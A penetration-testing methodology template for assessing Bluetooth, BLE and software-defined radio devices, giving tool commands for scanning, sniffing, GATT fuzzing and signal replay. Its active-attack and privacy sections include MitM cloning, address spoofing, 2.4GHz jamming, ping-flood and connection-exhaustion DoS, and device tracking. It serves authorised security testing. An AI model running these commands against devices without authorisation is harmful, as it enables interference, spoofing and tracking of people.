# Bluetooth & Radio Security Assessment Methodology Template

> **Template Version:** 1.1
> **Derived From:** Historical engagements
> **Target:** Bluetooth devices, BLE peripherals, SDR-accessible radio protocols

---

## Overview

This method covers Bluetooth devices, BLE peripherals, and radio protocols.
The phases cover discovery, traffic capture, protocol analysis, active operations, and privacy.
BLE means Bluetooth Low Energy.
SDR means software-defined radio.

Use the command examples with the selected target values.
Replace example paths, addresses, identifiers, and credentials before execution.
Record observed results in the deliverables.

---

## Phase 1: RF Environment Survey

### Objectives
- Identify target radio frequencies
- Enumerate nearby devices
- Map RF activity patterns
- Record interference sources

### Bluetooth Discovery
```bash
# Classic Bluetooth scan
hcitool scan

# BLE scan
hcitool lescan

# Extended scan with device info
btmgmt find

# Continuous monitoring
bluetoothctl
> scan on
```

### SDR Survey
```bash
# Spectrum analysis (RTL-SDR)
rtl_power -f 2400M:2500M:1M -g 50 -i 1s -e 60s scan.csv

# Waterfall visualization
gqrx  # GUI spectrum analyzer

# Specific frequency monitoring
rtl_fm -f 2441M -s 2M -r 48k - | aplay -r 48k -f S16_LE
```

### Ubertooth Survey (2.4GHz)
```bash
# Spectrum analysis
ubertooth-specan -l

# LAP discovery (find Bluetooth addresses)
ubertooth-rx -l

# Follow specific piconet
ubertooth-rx -u <UAP> -l <LAP>
```

### Deliverables
- [ ] RF environment map
- [ ] Device inventory with addresses
- [ ] Frequency usage pattern
- [ ] Interference assessment

---

## Phase 2: Bluetooth Classic Assessment

### Objectives
- Sniff piconet traffic
- Recover encryption keys
- Examine protocol exchanges
- Identify vulnerabilities

### Passive Sniffing
```bash
# Ubertooth piconet sniffing
ubertooth-btbb -t <BD_ADDR>

# Save captures
ubertooth-btbb -t <BD_ADDR> -c capture.pcap
```

### Pairing Analysis
```bash
# Monitor pairing (requires timing)
ubertooth-btbb -p

# Key recovery from pairing capture
# Requires full pairing capture with PIN entry
```

### L2CAP/RFCOMM Testing
```bash
# Service discovery
sdptool browse <BD_ADDR>

# L2CAP connection
l2ping <BD_ADDR>

# RFCOMM channel connection
rfcomm connect /dev/rfcomm0 <BD_ADDR> <channel>
```

### Classic Vulnerabilities
| Vulnerability | Test | Tool |
|--------------|------|------|
| KNOB Attack | Key negotiation | btlejack |
| BlueBorne | RCE via L2CAP | blueborne-scanner |
| Pairing PIN brute | 4-digit PIN | ubertooth |
| HID injection | Keyboard spoof | spooftooph |

### Deliverables
- [ ] Traffic captures (.pcap)
- [ ] Service enumeration
- [ ] Pairing security assessment
- [ ] Vulnerability findings

---

## Phase 3: BLE Assessment

### Objectives
- Enumerate services and characteristics
- Do tests of authentication mechanisms
- Fuzz GATT operations
- Identify privacy issues

### GATT Enumeration
```bash
# Connect and list services
gatttool -b <BD_ADDR> -I
> primary
> characteristics

# Automated enumeration
bettercap -eval "ble.recon on; ble.enum <BD_ADDR>"
```

### Characteristic Testing
```bash
# Read characteristic
gatttool -b <BD_ADDR> --char-read -a <handle>

# Write characteristic
gatttool -b <BD_ADDR> --char-write-req -a <handle> -n <value>

# Subscribe to notifications
gatttool -b <BD_ADDR> --char-write-req -a <cccd_handle> -n 0100
```

### BLE Fuzzing
```python
# Python BLE fuzzing with Bleak
import asyncio
from bleak import BleakClient

async def fuzz_characteristic(address, handle):
    fuzz_values = [
        b"\x00" * 512,  # Overflow
        b"\xff" * 256,  # Max values
        b"\x00",        # Empty
        b"A" * 1000,    # Large
    ]

    async with BleakClient(address) as client:
        for fuzz in fuzz_values:
            try:
                await client.write_gatt_char(handle, fuzz)
            except Exception as e:
                print(f"Crash candidate: {fuzz[:10]}... -> {e}")
```

### BLE Vulnerabilities
| Vulnerability | Test | Impact |
|--------------|------|--------|
| Just Works pairing | MitM | Traffic interception |
| Unencrypted characteristics | Sniff | Data leak |
| No authentication | Write arbitrary | Device control |
| Fixed passkey | Brute force | Pairing bypass |
| MAC randomization off | Track | Privacy violation |

### Deliverables
- [ ] GATT service map
- [ ] Characteristic permissions
- [ ] Fuzzing results
- [ ] Privacy assessment

---

## Phase 4: SDR-Based Analysis

### Objectives
- Capture raw RF signals
- Demodulate proprietary protocols
- Examine modulation schemes
- Replay captured signals

### Signal Capture
```bash
# Record raw IQ samples
rtl_sdr -f <freq> -s 2.4M -g 50 capture.raw

# HackRF capture
hackrf_transfer -r capture.raw -f <freq> -s 10M -g 40

# USRP capture
uhd_rx_cfile -f <freq> -r 10M capture.raw
```

### GNURadio Analysis
```python
# gnuradio-companion flowgraph components
# Source -> Low Pass Filter -> Demod -> Sink

# FSK demodulation
from gnuradio import analog
fsk_demod = analog.quadrature_demod_cf(1.0)

# Clock recovery
from gnuradio import digital
clock_recovery = digital.clock_recovery_mm_ff(
    samples_per_symbol, 0.25*0.175*0.175, 0.5, 0.175, 0.005
)
```

### Protocol Reverse Engineering
```bash
# Convert raw to WAV for analysis
sox -t raw -r 2.4M -e float -b 32 capture.raw capture.wav

# Inspectrum for visualization
inspectrum capture.raw

# Baudline for protocol analysis
baudline -stdin < capture.raw
```

### Signal Replay
```bash
# Replay captured signal
hackrf_transfer -t capture.raw -f <freq> -s 10M -x 40

# With rtl_433 for known protocols
rtl_433 -r capture.raw  # Analyze
# Then craft and transmit
```

### Deliverables
- [ ] Raw capture files
- [ ] GNURadio flowgraphs
- [ ] Protocol documentation
- [ ] Replay PoC

---

## Phase 5: Active Attacks

### Objectives
- Do MitM attacks
- Inject malicious data
- Spoof legitimate devices
- Do tests of denial of service

### BLE MitM (GATTacker)
```bash
# Scan for target
gattacker -s

# Clone device
gattacker -c <BD_ADDR>

# MitM position
gattacker -m <BD_ADDR>
```

### Bluetooth Classic Spoofing
```bash
# Change adapter address
bdaddr -i hci0 <TARGET_BD_ADDR>

# Spoof device class
hciconfig hci0 class <CLASS>

# Spoof device name
hciconfig hci0 name "<NAME>"
```

### Jamming (Authorized Testing Only)
```bash
# 2.4GHz broadband jam (USE WITH CAUTION - ILLEGAL WITHOUT AUTH)
# Ubertooth hop mode saturates channels
ubertooth-specan -j  # TX mode

# Targeted BLE channel jam
# Requires custom firmware
```

### DoS Attacks
```bash
# L2CAP ping flood
l2ping -f <BD_ADDR>

# Connection exhaustion
for i in {1..100}; do
    hcitool cc <BD_ADDR> &
done

# Malformed packet injection
# Requires custom baseband access
```

### Deliverables
- [ ] MitM demonstration
- [ ] Spoofing PoC
- [ ] DoS assessment
- [ ] Impact documentation

---

## Phase 6: Privacy Assessment

### Objectives
- Evaluate address randomization
- Do tests of tracking resistance
- Check data leakage
- Examine encryption usage

### Address Analysis
```bash
# Monitor address changes
watch -n 1 'hcitool lescan --duplicates 2>&1 | head -20'

# Analyze address types
# Public: Unique, trackable
# Random Static: Changes per boot
# Random Resolvable: Changes frequently
# Random Non-resolvable: Ephemeral
```

### Tracking Tests
```python
# Passive tracking test
def track_device(target_pattern):
    seen = {}
    while True:
        devices = scan_ble()
        for dev in devices:
            if matches(dev, target_pattern):
                seen[dev.address] = time.time()
                if is_random_address(dev.address):
                    check_irk_resolution(dev)

# IRK resolution attack
# If IRK known, can resolve random addresses
```

### Data Leakage
```bash
# Monitor advertisement data
btmgmt find | tee adv_data.log

# Look for:
# - Device names in advertisements
# - Manufacturer data revealing identity
# - Service UUIDs correlating activities
```

### Deliverables
- [ ] Address randomization assessment
- [ ] Tracking feasibility report
- [ ] Data leakage inventory
- [ ] Privacy recommendations

---

## Tools Reference

| Category | Tools |
|----------|-------|
| BLE | gatttool, bettercap, bleak |
| Classic | hcitool, sdptool, spooftooph |
| Sniffing | ubertooth, btlejack |
| SDR | rtl_sdr, hackrf, GNURadio |
| Analysis | Wireshark, inspectrum |
| Fuzzing | bleah, gattacker |

### Hardware

| Device | Use Case |
|--------|----------|
| Ubertooth One | BT Classic/BLE sniffing |
| HackRF | Wideband SDR |
| RTL-SDR | Receive-only SDR |
| nRF52 DK | BLE injection |
| BladeRF | Full-duplex SDR |

---

## Checklist Summary

- [ ] Phase 1: RF survey complete
- [ ] Phase 2: Bluetooth Classic assessed
- [ ] Phase 3: BLE assessed
- [ ] Phase 4: SDR analysis complete
- [ ] Phase 5: Active attacks tested
- [ ] Phase 6: Privacy assessed
